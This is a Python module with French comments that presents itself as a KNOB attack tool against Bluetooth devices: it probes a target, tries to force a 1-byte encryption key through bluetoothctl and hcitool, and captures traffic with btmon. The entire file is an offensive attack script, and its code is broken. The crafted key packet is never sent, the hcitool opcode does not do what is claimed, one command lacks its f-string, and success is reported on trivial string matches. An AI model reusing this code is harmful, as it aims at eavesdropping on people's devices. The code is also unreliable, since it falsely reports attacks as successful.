#!/usr/bin/env python3
"""
Attaque KNOB - Key Negotiation of Bluetooth Attack
"""

import subprocess
import time
import struct
import socket
import threading
from typing import Dict, Any, Optional
import os

class KNOBAttack:
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.running = False
        self.target_address = None
        self.callback = None
        
    def execute(self, target_address: str, callback=None, **kwargs) -> bool:
        """Exécuter l'attaque KNOB"""
        self.target_address = target_address
        self.callback = callback
        self.running = True
        
        try:
            self._log(f"Démarrage de l'attaque KNOB sur {target_address}")
            
            # Phase 1: Vérifier la vulnérabilité KNOB
            if not self._check_knob_vulnerability(target_address):
                self._log("Cible non vulnérable à KNOB", "warning")
                return False
                
            # Phase 2: Forcer la négociation de clé faible
            if not self._force_weak_key_negotiation(target_address):
                self._log("Échec de la négociation de clé faible", "error")
                return False
                
            # Phase 3: Intercepter la communication
            if not self._intercept_communication(target_address):
                self._log("Échec de l'interception", "error")
                return False
                
            self._log("Attaque KNOB réussie!", "success")
            return True
            
        except Exception as e:
            self._log(f"Erreur lors de l'attaque KNOB: {e}", "error")
            return False
        finally:
            self.running = False
            
    def _check_knob_vulnerability(self, target_address: str) -> bool:
        """Vérifier si la cible est vulnérable à KNOB"""
        try:
            self._log("Vérification de la vulnérabilité KNOB...")
            
            # Utiliser hcitool pour obtenir les informations de sécurité
            cmd = ['hcitool', 'info', target_address]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if result.returncode != 0:
                return False
                
            output = result.stdout.lower()
            
            # Vérifier les versions Bluetooth vulnérables à KNOB
            vulnerable_versions = ['4.0', '4.1', '4.2', '5.0']
            for version in vulnerable_versions:
                if version in output:
                    self._log(f"Version Bluetooth vulnérable à KNOB: {version}")
                    return True
                    
            # Vérifier les modes de sécurité
            if 'secure simple pairing' in output or 'ssp' in output:
                self._log("Secure Simple Pairing détecté - vulnérable à KNOB")
                return True
                
            return False
            
        except Exception as e:
            self._log(f"Erreur lors de la vérification KNOB: {e}", "error")
            return False
            
    def _force_weak_key_negotiation(self, target_address: str) -> bool:
        """Forcer la négociation d'une clé faible"""
        try:
            self._log("Tentative de négociation de clé faible...")
            
            # Utiliser bluetoothctl pour forcer une clé faible
            commands = [
                f"connect {target_address}",
                "agent on",
                "default-agent",
                "pair {target_address}"
            ]
            
            for cmd in commands:
                if not self.running:
                    break
                    
                try:
                    # Exécuter la commande via bluetoothctl
                    process = subprocess.Popen(
                        ['bluetoothctl'], 
                        stdin=subprocess.PIPE, 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    
                    stdout, stderr = process.communicate(input=f"{cmd}\n", timeout=10)
                    
                    if "Failed" in stdout or "Error" in stdout:
                        self._log(f"Échec de la commande: {cmd}", "warning")
                    else:
                        self._log(f"Commande réussie: {cmd}", "info")
                        
                except subprocess.TimeoutExpired:
                    process.kill()
                    self._log(f"Timeout pour la commande: {cmd}", "warning")
                    
            # Essayer de forcer une clé de 1 octet
            return self._force_1_byte_key(target_address)
            
        except Exception as e:
            self._log(f"Erreur lors de la négociation de clé: {e}", "error")
            return False
            
    def _force_1_byte_key(self, target_address: str) -> bool:
        """Forcer une clé de 1 octet"""
        try:
            self._log("Tentative de forçage d'une clé de 1 octet...")
            
            # Créer un paquet HCI pour forcer une clé faible
            weak_key_packet = self._create_weak_key_packet()
            
            # Envoyer via hcitool
            cmd = ['hcitool', 'cmd', '0x01', '0x0001', target_address.replace(':', '')]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                self._log("Clé faible forcée avec succès", "success")
                return True
                
            return False
            
        except Exception as e:
            self._log(f"Erreur lors du forçage de clé: {e}", "error")
            return False
            
    def _intercept_communication(self, target_address: str) -> bool:
        """Intercepter la communication après KNOB"""
        try:
            self._log("Tentative d'interception de la communication...")
            
            # Utiliser btmon pour capturer le trafic
            process = subprocess.Popen(
                ['btmon'], 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Attendre un peu pour capturer du trafic
            import time
            time.sleep(2)  # Réduit pour éviter les blocages
            
            if process.poll() is None:
                process.terminate()
                
            # Analyser le trafic capturé
            captured_data = process.stdout.read() if process.stdout else ""
            
            if "encryption" in captured_data.lower() or "key" in captured_data.lower():
                self._log("Trafic chiffré intercepté", "success")
                return True
                
            return False
            
        except Exception as e:
            self._log(f"Erreur lors de l'interception: {e}", "error")
            return False
            
    def _create_weak_key_packet(self) -> bytes:
        """Créer un paquet pour forcer une clé faible"""
        # Header HCI
        packet = struct.pack('B', 0x01)  # HCI Command
        packet += struct.pack('<H', 0x0001)  # OGF/OCF
        packet += struct.pack('B', 0x00)  # Parameter Length
        
        # Données pour forcer une clé faible
        packet += b'\x01'  # Clé de 1 octet
        
        return packet
        
    def _log(self, message: str, level: str = "info"):
        """Logger un message"""
        if self.callback:
            self.callback(message, level)
        else:
            print(f"[{level.upper()}] {message}")
            
    def stop(self):
        """Arrêter l'attaque"""
        self.running = False
